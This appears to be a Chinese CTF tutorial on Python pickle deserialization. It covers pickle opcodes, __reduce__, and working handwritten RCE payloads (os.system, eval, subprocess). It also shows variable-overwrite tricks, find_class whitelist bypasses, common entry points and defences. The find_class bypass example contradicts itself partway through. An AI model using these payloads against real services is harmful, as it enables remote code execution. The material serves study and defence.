Pickle反序列化

在比赛中经常看到 Pickle反序列化，这个 Pickle 究竟是个啥？

作为名词时，主要指代通过醋、盐卤腌制的蔬菜或水果（如泡菜、腌黄瓜），亦可指腌制容器（如泡菜坛）。动词含义为“腌制”，涉及食材浸泡保存的工艺。

确实就是咸菜，酸黄瓜之类的意思。

其实还挺贴合它在 Python 中的作用的（）

pickle简介

和 PHP 及其他语言类似，现代的 Python 也有序列化功能用来长期存储内存中的数据。

pickle 模块就是用来序列化和反序列化 Python 对象的标准库模块。

它可以将几乎所有的 Python 对象写成二进制文件，或者通过网络传输，然后在需要时重新加载。

pickle 字节流由一系列 opcode（操作码）组成，它的反序列化器像一个栈式虚拟机，逐条读取并执行：

  • 压栈、出栈
  • 导入全局对象（如某个模块里的函数/类）
  • 调用函数
  • 构造对象
  • 设置对象属性
  • 结束

它不像 JSON 那样只是描述数据，而是包含了执行构造动作的指令流。

pickle 反序列化时可以执行 GLOBAL、REDUCE、BUILD 等 opcode，攻击者可以手工构造字节流，让反序列化过程去导入并调用某些函数，或者构造/修改对象状态。经典攻击效果就是：反序列化不可信 pickle 就约等于RCE。

当然执行什么还取决于目标环境有哪些模块和函数可用。

正是因此，手写 opcode 会比用 pickle 序列化生成的代码更加灵活。

比如说，正常 pickle.dumps 一个字符串，一般不会生成导入 os 并调用 system这种指令；但手工拼 pickle 字节流可以包含这类 opcode 组合。

object.__reduce__() 函数

__reduce__() 函数在对象被 pickle 序列化时被 pickle.dumps() 调用。它返回一个元组，告诉 pickle：“反序列化时请这样重建我”。

比如：

1import pickle
2
3class A:
4    def __reduce__(self):
5        return (print, ("hello",))
6
7pickle.dumps(A())

这里 A 的 __reduce__() 返回：

1(print, ("hello",))

__reduce__() 的返回值结构

__reduce__() 的返回值可以是一个 2 到 6 元的元组（Python 3.8+ 支持第6个元素），最常见的是 2 元组：

1(callable, args)
2# 或
3(callable, args, state)
4# 或
5(callable, args, state, listitems, dictitems)
  • 第一个元素：一个可调用对象（函数、类等），反序列化时会调用它
  • 第二个元素：调用时传入的参数元组
  • 第三个元素（可选）：对象的状态，会通过 __setstate__() 或 __dict__ 更新应用到对象上
  • 第四、五个元素（可选）：用于 list/dict 子类的迭代器

关键点在于：第一个元素可以是任意可调用对象。pickle 反序列化时，会去导入这个可调用对象并执行 callable(*args)。如果攻击者能控制 __reduce__() 的返回值，就等同于控制了反序列化时要执行的函数和参数。

注意：__reduce__() 的返回值是在序列化时构造的，所以里面写的 getattr(x, "y") 是在 pickle.dumps 那一刻就求值了；反序列化时 REDUCE 只是调用第一个元素。

构造恶意 pickle

理解了 __reduce__() 之后，构造恶意 pickle 就很简单了——我们不需要真的有一个类，可以直接用 pickle.dumps 生成，也可以手工构造。最经典的就是：

1import pickle
2import os
3
4class Evil:
5    def __reduce__(self):
6        return (os.system, ("whoami",))
7
8payload = pickle.dumps(Evil())

反序列化这段字节流时，pickle 会：

  1. 通过 GLOBAL opcode 导入 os.system
  2. 通过 REDUCE opcode 调用 os.system("whoami")
  3. 执行系统命令

等价的手写 opcode 大概是：

1b"cos\nsystem\n(S'whoami'\ntR."

用 pickletools.dis() 反汇编一下更清楚：

1import pickletools
2pickletools.dis(b"cos\nsystem\n(S'whoami'\ntR.")

输出大致是：

1    0: c    GLOBAL     'os system'
2   11: (    MARK
3   12: S        STRING     'whoami'
4   22: t        TUPLE      (MARK at 11)
5   23: R    REDUCE
6   24: .    STOP

GLOBAL 压入 os.system，STRING 压入 "whoami"，TUPLE 把参数打包成元组，REDUCE 执行调用，STOP 结束。整个过程就是一个栈式虚拟机的执行流。

PVM：栈、memo 与 opcode 速查

前面说 pickle 反序列化器是“栈式虚拟机”，具体来说它由三部分组成：

  • 解析引擎：逐条读 opcode 并执行，遇到 .（STOP）停止
  • 栈：Python list，临时存放数据和参数，反序列化结束时栈顶就是 pickle.loads() 的返回值
  • memo：Python dict，用 p（PUT，存）和 g（GET，取）两个 opcode 操作，让同一个对象在字节流里只构造一次、多次复用

理解了栈和 memo，手写 opcode 就是“想象栈上有什么，然后选对应的 opcode”。v0 协议常用 opcode 如下（手写一般用 v0，因为可读性最好）：

opcode 名称 作用 栈变化
c GLOBAL 导入 module.name 并入栈，会触发 find_class() 对象入栈
S STRING 压入字符串 字符串入栈
V UNICODE 压入 unicode 字符串 字符串入栈
I INTEGER 压入整数 整数入栈
F FLOAT 压入浮点数 浮点数入栈
N NONE 压入 None None 入栈
( MARK 压入标记，供 t/d/l 组合用 MARK 入栈
t TUPLE MARK 到栈顶组成元组 元组入栈
) EMPTY_TUPLE 压入空元组 空元组入栈
l LIST MARK 到栈顶组成列表 列表入栈
] EMPTY_LIST 压入空列表 空列表入栈
d DICT MARK 到栈顶组成字典（偶数个元素） 字典入栈
} EMPTY_DICT 压入空字典 空字典入栈
R REDUCE 调 TOS1(*TOS)，对应 __reduce__。即弹出栈顶的参数元组和次栈顶的 callable，执行 callable(*args) 返回值入栈
b BUILD 用 TOS 作为 state 设置 TOS1（触发 __setstate__ 或更新 __dict__） 两元素出栈
s SETITEM TOS2[TOS1] = TOS 三元素出栈
a APPEND TOS1.append(TOS) 两元素出栈
e APPENDS MARK 到栈顶的元素 extend 到 TOS —
u SETITEMS MARK 到栈顶的 key-value 对更新到 TOS —
o OBJ 找 MARK，以之间第一个元素为 callable，其余为参数，调用 返回值入栈
i INST 先 GLOBAL 拿 callable，再找 MARK 组合参数并调用 返回值入栈
p / g PUT / GET 存/取 memo —
0 POP 丢弃栈顶 —
. STOP 结束，栈顶作为返回值 —

完整表见 pickle.py 源码。有了这张表，回头看 b"cos\nsystem\n(S'whoami'\ntR." 就一目了然：c 压 os.system → ( 开 MARK → S 压参数 → t 打包成元组 → R 调用 → . 结束。

手写 opcode：从单函数到多指令

__reduce__ 的局限是一次只能调一个函数。实战里经常要一次执行多条命令、或先覆盖变量再执行函数，这时候就需要手写 opcode。

同一个 os.system("whoami")，有三种等价写法（R / i / o），都值得会：

1# R 写法（最常见）
2b"cos\nsystem\n(S'whoami'\ntR."
3
4# i 写法：先 MARK，参数入栈，i 再导入 callable 并调用
5b"(S'whoami'\nios\nsystem\n."
6
7# o 写法：先 MARK，callable 入栈，参数入栈，o 调用
8b"(cos\nsystem\nS'whoami'\no."

i 和 o 的区别在于：i 是“先参数后 callable”，o 是“先 callable 后参数”，两者都靠 MARK 界定参数边界。

拼接多条指令：pickle 流之间可以直接拼接——去掉第一个流的结尾 .，把第二个流接上去，保留第二个流的 . 即可：

1b"cos\nsystem\n(S'whoami'\ntR" + b"cos\nsystem\n(S'id'\ntR."

反序列化时会先执行 whoami，再执行 id。这是 __reduce__ 做不到的，也是手写 opcode 灵活性的直接体现。

不仅仅是 os.system

实际比赛中，os.system 往往是被过滤的重点，常见的替代思路有：

 1# subprocess
 2(subprocess.check_output, (["whoami"],))
 3
 4# eval / exec
 5(eval, ("__import__('os').system('whoami')",))
 6(exec, ("import os; os.system('whoami')",))
 7
 8# 通过 builtins
 9(__import__('builtins').eval, ("1+1",))
10
11# 通过 os.popen
12(os.popen, ("whoami",))
13
14# 通过 platform
15(platform.popen, ("whoami",))

getattr 的正确用法需要特别注意：__reduce__ 的第一个元素是被调用的，不是被求值的。所以：

1(getattr, (os, "system"))                  # ❌ 只拿到 os.system 函数对象，不会执行
2(getattr(os, "system"), ("whoami",))       # ✅ 先求值拿到函数，再让 REDUCE 调用它

更隐蔽的还可以用 map、functools.reduce 等做链式调用。本质上只要能在目标环境里找到一个可调用 + 能执行命令/代码的组合，就能打出 RCE。

变量覆盖

pickle 除了 RCE，还有另一条非常常见的利用路径：变量覆盖。不需要执行任何命令，改掉目标程序里的某个变量就能绕过验证、拿到 flag。

假设目标程序：

 1# secret.py
 2name = 'leyi'
 3
 4# main.py
 5import pickle
 6import secret
 7
 8opcode = b"c__main__\nsecret\n(S'name'\nS'btop251'\ndb."
 9pickle.loads(opcode)
10print(secret.name)   # 输出 btop251

payload 拆解：

1c__main__\nsecret\n   # GLOBAL：拿到 __main__.secret 模块对象
2(                     # MARK
3S'name'               # 压 key
4S'btop251'            # 压 value
5d                     # DICT：组合成 {'name': 'btop251'}
6b                     # BUILD：对 secret 模块对象做属性更新

BUILD 对模块对象会优先调用 __setstate__，如果对象没有这个，就会退回到兜底路径走 inst.__dict__.update(state) 这条路，于是 secret.name 被改成 'btop251'。

这个思路在 CTF 里比 RCE 更常见，因为它绕过了 find_class 对危险函数的拦截——你只需要白名单里允许一个可写的模块/对象就行。

绕过过滤的常见技巧

很多题目会对 pickle 字节流做黑名单过滤，比如禁止 os、system、eval 等字符串。常见的绕过方式：

  1. getattr 动态获取：(getattr(os, "system"), ("whoami",))，函数在序列化时求值，字符串里的 system 可能躲过黑名单
  2. __builtins__ 字典访问：(eval, ("__import__('os').system('whoami')",)) 里把字符串拆开拼接，躲过关键字匹配
  3. 使用 BUILD opcode：先构造对象实例，再通过 BUILD 设置其 __dict__，配合 __setstate__ 触发
  4. GLOBAL 可以指向任意模块的属性：比如 os.path、subprocess.Popen，甚至 builtins.__import__
  5. REDUCE 的替代：NEWOBJ、OBJ、INST 等 opcode 也能构造对象，BUILD 能触发状态设置

一个经典的 BUILD 利用链：

1import pickle
2
3class Evil:
4    def __setstate__(self, state):
5        import os
6        os.system(state["cmd"])
7
8# 反序列化时 __setstate__ 会被调用
9payload = b"c__main__\nEvil\n)R(S'cmd'\nS'whoami'\ndb."

逐条看：

1c__main__\nEvil\n   # GLOBAL：压入 Evil 类
2)                   # EMPTY_TUPLE：压空元组
3R                   # REDUCE：调用 Evil()，得到实例
4(                   # MARK
5S'cmd'              # 压 key
6S'whoami'           # 压 value
7d                   # DICT：组合成 {'cmd': 'whoami'}
8b                   # BUILD：以 dict 为 state 触发 __setstate__

这里 ) + R 先实例化对象是关键，少了这一步 BUILD 作用在类对象上会直接报错。

find_class()：CTF 的正面战场

官方对 pickle 安全问题的建议是改写 pickle.Unpickler.find_class()，用白名单限制能导入的模块和对象。所以 CTF 里 pickle 题 90% 的过滤点都在这个函数上，能不能绕过 find_class 基本决定了能不能拿分。

先搞清楚它什么时候被调用：

  • opcode 角度：c（GLOBAL）、i（INST）、STACK_GLOBAL（\x93）这三个 opcode 在解析时会触发 find_class()。STACK_GLOBAL 仅在协议 4+ 中可用，手写 v0 payload 时用不到它，但阅读现代序列化数据时会遇到
  • 调用次数：每个 opcode 只调一次。也就是说 find_class() 只需要过一次，之后在字节流里再产生的函数/对象即使命中黑名单也不会被二次拦截

下面看两个典型的过滤与绕过。

例 1：只允许 builtins，但黑名单有漏网之鱼

1safe_builtins = {'range', 'complex', 'set', 'frozenset', 'slice'}
2blacklist = {'eval', 'exec', 'execfile', 'compile', 'open', 'input', '__import__', 'exit'}
3
4class RestrictedUnpickler(pickle.Unpickler):
5    def find_class(self, module, name):
6        if module == "builtins" and name in safe_builtins:
7            return getattr(builtins, name)
8        raise pickle.UnpicklingError("global '%s.%s' is forbidden" % (module, name))

黑名单里没有 getattr，于是可以用 getattr 从 builtins 里“捞”出被禁的 eval：

1import builtins
2class Evil:
3    def __reduce__(self):
4        eval_func = getattr(builtins, "eval")   # 序列化时求值，拿到 eval
5        return (eval_func, ("__import__('os').system('whoami')",))

find_class 只看到 builtins.eval 这一次导入？不——getattr(builtins, "eval") 在序列化时就已经执行完了，__reduce__ 返回的第一个元素直接就是 eval 函数对象，pickle 只负责把函数对象序列化进去（通过 GLOBAL 导入 builtins.eval）。所以这个思路在 find_class 白名单只允许 builtins 时其实过不了 eval 这关——真正能过的是白名单里允许 getattr 本身时：

1class Evil:
2    def __reduce__(self):
3        return (getattr, (builtins, "eval"))   # ❌ 只返回 eval，不执行

要执行得再加一层：

1class Evil:
2    def __reduce__(self):
3        return (getattr(builtins, "eval"), ("__import__('os').system('whoami')",))  # ✅

但 getattr(builtins, "eval") 在序列化时求值，序列化出来还是 builtins.eval 的 GLOBAL，find_class 一样会拦。所以这条绕过真正生效的前提是白名单允许 getattr 这个 callable 本身被导入——比如 Code-Breaking 那题白名单里就有 getattr，于是可以用 getattr(builtins, "eval") 在反序列化时动态取到 eval 再调用。

例 2：只允许 __main__ 模块

1class RestrictedUnpickler(pickle.Unpickler):
2    def find_class(self, module, name):
3        if module == '__main__':
4            return getattr(sys.modules['__main__'], name)
5        raise pickle.UnpicklingError(...)

看起来只允许主程序自己的对象，很安全。但被主程序 import 的模块都挂在 __main__ 下——比如 main.py 里 import secret，那么 __main__.secret 就是那个模块对象，可以直接改：

1b"c__main__\nsecret\n(S'name'\nS'1'\ndb."

这就是“变量覆盖”在 find_class 白名单下的经典打法。

find_class 只拦 GLOBAL/INST 的导入动作，不拦后续的 REDUCE/BUILD/SETITEM。所以绕过的核心思路要么是“找一个白名单里允许、但能间接拿到危险 callable 的跳板”（getattr、globals、__builtins__），要么是“根本不需要危险 callable，改数据就行”（变量覆盖）。

协议版本与环境差异

pickle 有 0~5 共 6 个协议版本，手写 payload 一般用 v0，因为可读性最好，而且向下兼容（v0 在所有 Python 版本都能解析）。用 pickle.dumps(obj, protocol=i) 可以指定版本。

环境差异也要注意：

  • Linux vs Windows：os.system 在 Linux 上序列化出来是 cposix\nsystem\n，Windows 上是 cnt\nsystem\n。手写 payload 用 cos\nsystem\n 最稳，因为 os 模块本身跨平台。os.system 在 CPython 中实际上定义在 posix（Unix）或 nt（Windows）模块里，只是被重新导出到 os 命名空间。手写 cos\nsystem\n 之所以跨平台，是因为 os 模块本身在所有平台上都存在，并且 os.system 总是可用的。
  • Python 2 vs Python 3：GLOBAL 的模块路径、字符串类型（str vs bytes）、REDUCE 的行为在部分细节上有差异，跨版本 payload 需要实测

实战中的入口

Pickle 反序列化在 CTF 和真实场景中常见的入口：

  • Flask session：某些场景下 session 用 pickle 序列化（较少见，但存在）
  • 缓存：Redis、Memcached 里存的是 pickle 字节流
  • RPC / 消息队列：Celery 默认用 pickle 序列化任务
  • 文件上传：上传 .pkl 文件后被 pickle.load() 读取
  • Cookie：某些框架把 pickle 塞进 cookie
  • pickle.loads(request.data)：最直接的入口，题目里常见

防御

  • 永远不要反序列化不可信数据，这是根本原则
  • 用 json、msgpack 等纯数据格式替代
  • 如果必须用 pickle，可以用 pickle.Unpickler 子类重写 find_class() 做白名单限制：
1import pickle
2
3class SafeUnpickler(pickle.Unpickler):
4    def find_class(self, module, name):
5        if module == "builtins" and name in ("str", "int", "list", "dict"):
6            return super().find_class(module, name)
7        raise pickle.UnpicklingError(f"禁止导入 {module}.{name}")
8
9SafeUnpickler(io.BytesIO(data)).load()
  • 或者用 pickletools.genops() 先做静态检查，黑名单过滤 GLOBAL、REDUCE、BUILD 等危险 opcode（但绕过方式很多，只能算缓解）
